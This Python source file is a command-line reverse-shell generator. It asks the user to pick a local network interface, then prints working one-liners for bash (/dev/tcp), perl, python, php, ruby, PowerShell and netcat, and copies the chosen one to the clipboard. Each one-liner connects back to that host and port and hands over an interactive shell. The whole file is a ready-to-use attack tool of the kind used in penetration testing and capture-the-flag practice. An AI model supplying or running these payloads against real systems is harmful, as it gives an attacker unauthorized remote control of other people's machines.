#!/usr/bin/python3

from printy import printy
import argparse
import netifaces
import pyperclip

def get_parser():
    parser = argparse.ArgumentParser(description="Generates a reverse shell command for the specified subsystem")
    parser.add_argument("-p","--port",action="store", dest="port",default=443, type=int, help="Specifies the port to open the connection in")
    parser.add_argument("-H","--hexadecimal",action="store_true",dest="hexadecimal",default=False, help="Encode the ip in hexadecimal")
    parser.add_argument("-S","--list-subsystems",action="store_true", dest="list_subsystems",default=False, help="List available subsystems")    
    parser.add_argument("-s","--subsystem",action="store", dest="subsystem",default="bash", help="What subsystem the reverse shell is going to execute")
    return parser

def print_banner():
    banner = """
__________                        _________.__           .__  .__   
\______   \ _______  __          /   _____/|  |__   ____ |  | |  |  
 |       _// __ \  \/ /  ______  \_____  \ |  |  \_/ __ \|  | |  |  
 |    |   \  ___/\   /  /_____/  /        \|   Y  \  ___/|  |_|  |__
 |____|_  /\___  >\_/           /_______  /|___|  /\___  >____/____/
        \/     \/                       \/      \/     \/           
"""
    printy(banner,"y>")

def get_subsystems():
    return ["bash","nc","python","powershell","php","perl","ruby"]

def get_revshell(subsystem,ip,port):
    if subsystem.lower() == "bash":
        return f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
    elif subsystem.lower() == "perl":
        return f"perl -e \"use Socket;$i='{ip}';$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');}};\""
    elif subsystem.lower() == "python":
        return f"python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{ip}',{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);\""
    elif subsystem.lower() == "php":
        return f"php -r \"$sock=fsockopen({ip},{port});exec('/bin/sh -i <&3 >&3 2>&3');\""
    elif subsystem.lower() == "ruby":
        return f"ruby -rsocket -e\"f=TCPSocket.open({ip},{port}).to_i;exec sprintf('/bin/sh -i <&%d >&%d 2>&%d',f,f,f)\""
    elif subsystem.lower() == "powershell":
        return f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\""
    elif subsystem.lower() == "nc":
        return f"nc -e /bin/sh {ip} {port}"
    else:
        return None

def list_node(style):
    return f"[r][{style}] "

def list_subsystems():
    subsystems = get_subsystems()
    for item in subsystems:
        printy(list_node("+"),end="")
        printy(item,"c")

def is_localhost(address):
    return address == '127.0.0.1'

def menu():
    i = 1
    ifaces = []
    for iface in netifaces.interfaces():
        iface_info = netifaces.ifaddresses(iface).get(2)
        if iface_info and not is_localhost(iface_info[0]['addr']):
            ifaces = ifaces + [iface_info[0]]
            printy(list_node(i),end="") 
            print(f"{iface}: {iface_info[0]['addr']}")
            i = i+1
    return ifaces

def app():
    parser = get_parser()
    args = parser.parse_args()
    print_banner()
    if(args.list_subsystems):
        list_subsystems()
        return
    if(args.subsystem):
        ifaces = menu()
        option = int(input("Choose what interfaces to use: ")) 
        revshell = get_revshell(args.subsystem,ifaces[option - 1]['addr'],args.port)
        pyperclip.copy(revshell)
        printy(revshell,'c')

app()